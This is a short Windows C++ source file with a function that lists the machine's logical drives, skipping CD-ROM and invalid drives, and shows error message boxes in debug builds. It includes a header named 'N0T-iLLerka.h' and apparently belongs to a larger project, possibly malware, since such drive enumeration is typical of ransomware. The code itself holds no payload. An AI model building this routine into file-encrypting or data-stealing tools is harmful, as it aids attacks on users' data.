#include "../../Header-Files/pch.h"
#include "../../Header-Files/N0T-iLLerka.h"

BOOL fnDriveEnumeratorW(
	_Inout_ std::vector<std::wstring>& vszDrives
) {
	WCHAR szDrives[nDRIVES];
	std::wstring szDrive;
	if (GetLogicalDriveStrings(nDRIVES, szDrives)) {
		for (INT i = 0; i < nDRIVES; i += 4) {
			if (szDrives[i] != L'\0') {
				szDrive = std::wstring{ szDrives[i], szDrives[i + 1], szDrives[i + 2] };
				UINT uDt = GetDriveType(szDrive.c_str());
				if (uDt) {
					if (uDt != DRIVE_NO_ROOT_DIR && uDt != DRIVE_CDROM) {
						vszDrives.push_back(szDrive);
					}
				} else {
#ifdef DEBUG_MSG
					fnErrorHandlerW(L"Couldn't determin Drive type\nPath: %s", NULL, L"GetDriveTypeW", MB_OK | MB_ICONWARNING, szDrive.c_str());
#endif // DEBUG_MSG
				}
			}
		}

		return TRUE;
	} else {
#ifdef DEBUG_MSG
		fnErrorHandlerW(L"Couldn't enumerate Drives", NULL, L"GetLogicalDriveStringsW", MB_OK | MB_ICONERROR);
		MessageBox(NULL, L"Couldn't Enumerate Drives", L"GetLogicalDriveStringsW", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif // DEBUG_MSG
		return FALSE;
	}
}